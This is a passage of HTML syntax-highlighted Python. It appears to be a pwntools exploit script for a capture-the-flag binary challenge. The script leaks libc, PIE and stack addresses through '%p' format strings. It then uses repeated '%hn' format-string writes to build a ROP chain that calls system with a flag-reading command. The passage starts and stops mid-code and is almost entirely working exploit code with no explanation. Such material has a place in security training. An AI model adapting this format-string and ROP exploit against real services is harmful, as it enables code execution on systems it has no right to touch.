<span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\ngadget <span class=\"token operator\">=</span> <span class=\"token number\">0xe6c81</span>\n<span class=\"token comment\">#gdb.attach(p,\"b printf\")</span>\n\n<span class=\"token comment\">#7  __libc_start_main+243</span>\n<span class=\"token comment\">#7  栈地址</span>\n<span class=\"token comment\">#11 基地址0x82e</span>\n\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%7$p,\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"%11$p,\"</span> <span class=\"token operator\">+</span>  <span class=\"token string\">\"%9$p,\"</span>\n\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n__libc_start_main <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7f62b26990b3\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">243</span>\nlibc_base <span class=\"token operator\">=</span> __libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__libc_start_main\"</span><span class=\"token punctuation\">]</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\npie_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x55d2c451e82e\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x82e</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\nstack_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fffa24e6e58\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xe0</span>\n\ngadget_addr <span class=\"token operator\">=</span> gadget <span class=\"token operator\">+</span> libc_base\n\n<span class=\"token triple-quoted-string string\">'''\nlg(\"__libc_start_main\",__libc_start_main)\nlg(\"gadget_addr\",gadget_addr)\nlg(\"pie_addr\",pie_addr)\nlg(\"stack_addr\",stack_addr)\n'''</span>\n\nbss_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000201030</span> <span class=\"token operator\">+</span> pie_addr\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"bss_addr\"</span><span class=\"token punctuation\">,</span>bss_addr<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#gdb.attach(p,\"printf\")</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bss_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bss_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"niyah%11$sgalatea\"</span>\n\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyah\"</span><span class=\"token punctuation\">)</span>\nheap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000000065e</span> <span class=\"token operator\">+</span> pie_addr\npop_rdi_ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000000008f3</span> <span class=\"token operator\">+</span> pie_addr\nsystem_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"ret_addr\"</span><span class=\"token punctuation\">,</span>ret_addr<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop_rdi_ret_addr\"</span><span class=\"token punctuation\">,</span>pop_rdi_ret_addr<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap_addr\"</span><span class=\"token punctuation\">,</span>heap_addr<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr\"</span><span class=\"token punctuation\">,</span>system_addr<span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/catflag\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p,\"printf\")</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\n\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">16</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">16</span> <span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>system_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>system_addr <span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token 